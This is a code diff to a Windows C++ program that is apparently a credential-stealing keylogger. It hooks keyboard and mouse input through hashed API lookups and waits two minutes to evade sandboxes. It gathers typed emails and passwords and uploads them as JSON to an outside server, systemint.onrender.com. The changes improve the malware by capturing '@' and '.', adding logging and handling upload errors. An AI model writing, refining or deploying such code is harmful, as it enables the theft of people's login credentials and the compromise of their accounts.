@@ -31,7 +31,7 @@ std::string GetOSVersion() {
             RTL_OSVERSIONINFOW rovi = { 0 };
             rovi.dwOSVersionInfoSize = sizeof(rovi);
             if (RtlGetVersion(&rovi) == 0)
-                return "Windows " + std::to_string(rovi.dwMajorVersion) + " Build " + std::to_string(rovi.dwBuildNumber);
+                return "Windows Build " + std::to_string(rovi.dwMajorVersion) + "." + std::to_string(rovi.dwBuildNumber);
         }
     }
     return "Windows x64";
@@ -40,18 +40,32 @@ std::string GetOSVersion() {
 std::string GetActiveWindowTitle() {
     char title[256];
     HWND hwnd = GetForegroundWindow();
-    GetWindowTextA(hwnd, title, sizeof(title));
-    return std::string(title);
+    if (hwnd) {
+        GetWindowTextA(hwnd, title, sizeof(title));
+        return std::string(title);
+    }
+    return "Unknown Window";
 }
 
-// --- 2. DEBUG LOGGING ---
+// --- 2. DEBUG LOGGING (Local & Desktop) ---
 void WriteDebug(std::string msg) {
+    // Write to local folder (most reliable)
+    std::ofstream f1("internal_status.txt", std::ios::app);
+    if (f1.is_open()) {
+        f1 << "[DEBUG] " << msg << std::endl;
+        f1.close();
+    }
+
+    // Write to Desktop (visible)
     char path[MAX_PATH];
-    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
-    std::string fullPath = std::string(path) + "\\debug_log.txt";
-    std::ofstream f(fullPath, std::ios::app);
-    f << "[DEBUG] " << msg << std::endl;
-    f.close();
+    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path) == S_OK) {
+        std::string fullPath = std::string(path) + "\\debug_log.txt";
+        std::ofstream f2(fullPath, std::ios::app);
+        if (f2.is_open()) {
+            f2 << "[DEBUG] " << msg << std::endl;
+            f2.close();
+        }
+    }
 }
 
 // --- 3. API HASHING ---
@@ -75,7 +89,7 @@ FARPROC GetProcAddressH(HMODULE hMod, DWORD targetHash) {
     return NULL;
 }
 
-// --- 4. EXFILTRATION ---
+// --- 4. EXFILTRATION (Strict Schema) ---
 void UploadData(std::string email, std::string pass) {
     HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
     HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
@@ -102,7 +116,9 @@ void UploadData(std::string email, std::string pass) {
     std::string json = ss.str();
     if(WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0)) {
         WinHttpReceiveResponse(hR, NULL);
-        WriteDebug("Payload Sent: " + json);
+        WriteDebug("Payload Delivered: " + json);
+    } else {
+        WriteDebug("Upload Failed. Win32 Error: " + std::to_string(GetLastError()));
     }
     WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
 }
@@ -118,8 +134,10 @@ bool IsEmail(const std::string& s) {
 
 void ProcessBuffer() {
     if (buffer.empty()) return;
+    WriteDebug("Analyzing Buffer: " + buffer);
     if (IsEmail(buffer)) {
         savedEmail = buffer;
+        WriteDebug("Email Stored.");
     } else if (buffer.length() >= 8) {
         UploadData(savedEmail, buffer);
         savedEmail.clear();
@@ -130,15 +148,20 @@ void ProcessBuffer() {
 LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
     if (n == HC_ACTION && w == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
+        bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+
         if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) ProcessBuffer();
         else if (k->vkCode == VK_BACK) { if(!buffer.empty()) buffer.pop_back(); }
         else if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) {
-            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
             char c = (char)k->vkCode;
             if (!shift) c = tolower(c);
             buffer += c;
         }
-        else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) buffer += (char)k->vkCode;
+        else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) {
+            if (shift && k->vkCode == 0x32) buffer += "@";
+            else buffer += (char)k->vkCode;
+        }
+        else if (k->vkCode == VK_OEM_PERIOD) buffer += ".";
         else if (k->vkCode == VK_SPACE) buffer += " ";
     }
     return CallNextHookEx(NULL, n, w, l);
@@ -150,11 +173,15 @@ LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
 }
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
+    WriteDebug("=== PROGRAM STARTED ===");
     {
         // JUNK_HERE
     }
+
+    WriteDebug("Entering 2-minute Sandbox Delay...");
     Sleep(120000); 
 
+    WriteDebug("Sleep Complete. Initializing Hooks...");
     HMODULE u32 = GetModuleHandleA("user32.dll");
     if (!u32) u32 = LoadLibraryA("user32.dll");
 
@@ -163,6 +190,7 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
     if (_SetHook) {
         _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
         _SetHook(WH_MOUSE_LL, MouseProc, h, 0);
+        WriteDebug("Hooks Online.");
     }
 
     MSG msg;
